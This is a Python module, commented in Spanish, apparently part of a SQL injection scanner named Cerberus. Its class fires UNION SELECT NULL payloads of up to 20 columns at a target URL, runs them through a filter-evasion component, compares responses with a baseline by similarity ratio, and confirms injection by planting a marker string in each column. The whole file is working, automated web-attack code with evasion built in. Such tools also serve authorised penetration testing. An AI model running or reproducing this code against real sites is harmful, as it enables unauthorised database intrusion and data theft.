import logging
import asyncio
import difflib
from typing import Dict, Any, List, Optional
from backend.core.vector_base import BaseVector
from backend.core.payload_evader import PayloadEvader

logger = logging.getLogger("cerberus_vector_union")

class VectorUnion(BaseVector):
    """
    Motor nativo asíncrono para inyección basada en UNION.
    Intenta determinar el número de columnas y tipos de datos mediante fuerza bruta heurística.
    """

    MAX_COLUMNS = 20

    async def run(self, context: Dict[str, Any]) -> Dict[str, Any]:
        logger.info(f"[*] Native Engine: Iniciando Vector Union-based sobre {self.target_url}")
        
        # Instanciar el evasor dinámico
        evader = PayloadEvader(context.get("aggressiveness", 3))
        
        # 1. Baseline
        base_resp = await self._safe_get(self.target_url)
        if not base_resp:
            return {"status": "failed", "reason": "baseline_unreachable"}
            
        base_content = base_resp.text
        
        # 2. Heurística de columnas: ORDER BY (Más rápido que UNION SELECT NULL...)
        # Si ORDER BY 10 falla pero ORDER BY 1 funciona, hay < 10 columnas.
        # Por simplicidad en este MVP, usaremos el método directo de UNION NULL
        
        logger.info("[*] Probando conteo de columnas mediante UNION SELECT NULL...")
        
        for i in range(1, self.MAX_COLUMNS + 1):
            nulls = ",".join(["NULL"] * i)
            payload = evader.evade(f" UNION SELECT {nulls}-- ")
            test_url = self.inject_url(payload)
            
            resp = await self._safe_get(test_url)
            if not resp:
                continue
                
            # Si el código de estado es 200 y el ratio de similaridad es alto,
            # o si el error de sintaxis desaparece comparado con un payload erróneo:
            # Offload heavy CPU-bound ratio calculation to a separate thread
            def calculate_ratio():
                return difflib.SequenceMatcher(None, base_content, resp.text).ratio()
            
            ratio = await asyncio.to_thread(calculate_ratio)
            
            if resp.status_code == 200 and ratio > 0.80:
                # 3. Confirmación: Inyectar un marcador único
                marker = "CERBERUS_PRO_NATIVE_UNION"
                # Intentamos poner el marcador en cada columna
                for col_idx in range(i):
                    vals = ["NULL"] * i
                    vals[col_idx] = f"'{marker}'"
                    confirm_payload = evader.evade(f" UNION SELECT {','.join(vals)}-- ")
                    confirm_url = self.inject_url(confirm_payload)
                    
                    confirm_resp = await self._safe_get(confirm_url)
                    if confirm_resp and marker in confirm_resp.text:
                        logger.info(f"[+] Inyección UNION Exitosa: {i} columnas detectadas. Marcador hallado en col {col_idx}")
                        return {
                            "status": "vulnerable",
                            "technique": "UNION query-based",
                            "evidence": f"Successfully injected marker '{marker}' using UNION SELECT with {i} columns (index {col_idx})"
                        }

        return {"status": "not_vulnerable"}

    async def _safe_get(self, url: str):
        try:
            return await self.client.get(url, timeout=10.0)
        except Exception as e:
            logger.warning(f"Error HTTP en vector union: {e}")
            return None
